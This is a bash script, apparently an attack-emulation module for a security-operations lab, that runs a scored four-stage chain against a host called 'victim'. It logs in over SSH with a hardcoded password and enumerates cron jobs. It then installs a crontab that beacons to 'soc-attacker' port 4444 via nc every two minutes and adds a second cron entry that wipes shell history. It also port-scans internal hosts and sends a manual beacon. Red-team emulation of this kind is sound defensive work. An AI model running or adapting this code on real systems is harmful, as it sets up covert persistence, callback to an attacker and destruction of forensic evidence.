#!/bin/bash
###############################################################################
# VECTOR 4: Cron Job Persistence & Lateral Movement
# Kill Chain: Enum → Install Cron → Lateral Scan → Beacon
# MITRE ATT&CK: T1053.003 → T1053.003 → T1046
###############################################################################
set -uo pipefail

VICTIM="${VICTIM_HOST:-victim}"
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

log()  { echo -e "${CYAN}[$(date +%H:%M:%S)]${NC} $1"; }
ok()   { echo -e "${GREEN}[✓]${NC} $1"; }
fail() { echo -e "${RED}[✗]${NC} $1"; }
info() { echo -e "${YELLOW}[*]${NC} $1"; }

TOTAL_POINTS=0
report_stage() {
    local stage="$1" mitre="$2" tactic="$3" points="$4" status="$5"
    TOTAL_POINTS=$((TOTAL_POINTS + points))
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "  Stage: ${YELLOW}${stage}${NC}"
    echo -e "  MITRE: ${mitre} (${tactic})"
    echo -e "  Status: ${status}  |  Points: +${points}  |  Total: ${TOTAL_POINTS}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
}

do_ssh() {
    sshpass -p "www-data" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null www-data@"$VICTIM" "$@" 2>/dev/null
}

echo -e "\n${RED}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║       VECTOR 4: CRON PERSISTENCE & LATERAL MOVEMENT      ║${NC}"
echo -e "${RED}║  Enumerate → Install Cron → Lateral Scan                  ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}\n"

###############################################################################
# STAGE 1: Cron Job Enumeration (T1053.003 - Cron Discovery)
###############################################################################
info "Stage 1: Cron Job Enumeration"
log "Connecting as www-data and enumerating cron..."

CRON_ENUM=$(do_ssh '
echo "=== Current crontab ==="
crontab -l 2>/dev/null || echo "(no crontab)"

echo ""
echo "=== System cron directories ==="
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null

echo ""
echo "=== Cron spool permissions ==="
ls -la /var/spool/cron/ /var/spool/cron/crontabs/ 2>/dev/null

echo ""
echo "=== Running cron processes ==="
ps aux | grep -i cron | grep -v grep
' 2>/dev/null)

echo "$CRON_ENUM"

if [ -n "$CRON_ENUM" ]; then
    ok "Cron enumeration complete"
    report_stage "Cron Enumeration" "T1053.003" "Discovery" 10 "${GREEN}SUCCESS${NC}"
else
    fail "Could not enumerate cron"
    report_stage "Cron Enumeration" "T1053.003" "Discovery" 3 "${RED}FAILED${NC}"
fi

sleep 2

###############################################################################
# STAGE 2: Install Malicious Cron Job (T1053.003 - Cron Persistence)
###############################################################################
info "Stage 2: Installing Malicious Cron Job"
log "Installing beacon cron job as www-data..."

CRON_INSTALL=$(do_ssh '
# Install a cron job that beacons back to attacker every 2 minutes
(crontab -l 2>/dev/null; echo "*/2 * * * * /bin/bash -c \"echo beacon_$(hostname)_$(date +%s) | nc -w 2 soc-attacker 4444 2>/dev/null\"") | crontab -

# Also add a cleanup evasion cron
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c \"history -c; rm -f ~/.bash_history 2>/dev/null\"") | crontab -

echo "=== Installed crontab ==="
crontab -l
' 2>/dev/null)

echo "$CRON_INSTALL"

if echo "$CRON_INSTALL" | grep -q "beacon"; then
    ok "Malicious cron job installed — beacons every 2 minutes"
    ok "Anti-forensics cron installed — clears history every 5 minutes"
    report_stage "Cron Persistence" "T1053.003" "Persistence" 25 "${GREEN}SUCCESS${NC}"
else
    fail "Cron installation failed"
    report_stage "Cron Persistence" "T1053.003" "Persistence" 5 "${RED}FAILED${NC}"
fi

sleep 2

###############################################################################
# STAGE 3: Internal Network Scanning (T1046 - Network Service Scanning)
###############################################################################
info "Stage 3: Internal Network Scanning from Victim"
log "Scanning internal network from compromised victim..."

SCAN_OUT=$(do_ssh '
echo "=== Scanning internal hosts ==="
for h in backend soc-attacker; do
    echo ""
    echo "--- Host: $h ---"
    for p in 22 80 8080 3306 5432 6379 8443; do
        (echo scan | nc -w 1 "$h" "$p" 2>/dev/null && echo "  OPEN: $h:$p") &
    done
    wait
done

echo ""
echo "=== ARP table ==="
arp -a 2>/dev/null || ip neigh 2>/dev/null

echo ""
echo "=== Routes ==="
ip route 2>/dev/null || route -n 2>/dev/null

echo ""
echo "=== DNS resolution ==="
for h in backend soc-attacker victim; do
    IP=$(getent hosts "$h" 2>/dev/null | awk "{print \$1}")
    echo "  $h → $IP"
done
' 2>/dev/null)

echo "$SCAN_OUT"

if echo "$SCAN_OUT" | grep -qi "OPEN"; then
    OPEN_COUNT=$(echo "$SCAN_OUT" | grep -c "OPEN" || echo 0)
    ok "Found ${OPEN_COUNT} open ports on internal network"
    report_stage "Lateral Network Scan" "T1046" "Discovery" 20 "${GREEN}SUCCESS${NC}"
else
    info "No open ports found (hosts may be isolated)"
    report_stage "Lateral Network Scan" "T1046" "Discovery" 10 "${YELLOW}PARTIAL${NC}"
fi

sleep 2

###############################################################################
# STAGE 4: Verify Persistence (T1053.003 - Cron Verification)
###############################################################################
info "Stage 4: Verifying Persistence"
log "Checking cron job is active and will survive restarts..."

VERIFY=$(do_ssh '
echo "=== Crontab status ==="
crontab -l 2>/dev/null

echo ""
echo "=== Cron service status ==="
service cron status 2>/dev/null || echo "cron daemon running: $(pgrep cron | wc -l) processes"

echo ""
echo "=== Testing beacon manually ==="
echo "manual_beacon_test" | nc -w 2 soc-attacker 4444 2>/dev/null && echo "Beacon sent!" || echo "Beacon attempt (attacker may not be listening)"
' 2>/dev/null)

echo "$VERIFY"

if echo "$VERIFY" | grep -q "beacon"; then
    ok "Persistence verified — cron jobs active"
    report_stage "Persistence Verified" "T1053.003" "Persistence" 10 "${GREEN}SUCCESS${NC}"
else
    report_stage "Persistence Verified" "T1053.003" "Persistence" 5 "${YELLOW}PARTIAL${NC}"
fi

###############################################################################
# SUMMARY
###############################################################################
echo -e "\n${RED}╔══════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║                 ATTACK CHAIN COMPLETE                     ║${NC}"
echo -e "${RED}╠══════════════════════════════════════════════════════════╣${NC}"
echo -e "${RED}║${NC}  Vector:     Cron Persistence & Lateral Movement       ${RED}║${NC}"
echo -e "${RED}║${NC}  Stages:     4/4 executed                                ${RED}║${NC}"
echo -e "${RED}║${NC}  Total Score: ${GREEN}${TOTAL_POINTS} points${NC}                              ${RED}║${NC}"
echo -e "${RED}║${NC}                                                          ${RED}║${NC}"
echo -e "${RED}║${NC}  MITRE ATT&CK Techniques:                               ${RED}║${NC}"
echo -e "${RED}║${NC}    T1053.003  Cron (Discovery)         (Discovery)       ${RED}║${NC}"
echo -e "${RED}║${NC}    T1053.003  Cron (Persistence)       (Persistence)     ${RED}║${NC}"
echo -e "${RED}║${NC}    T1046      Network Service Scan     (Discovery)       ${RED}║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════╝${NC}\n"
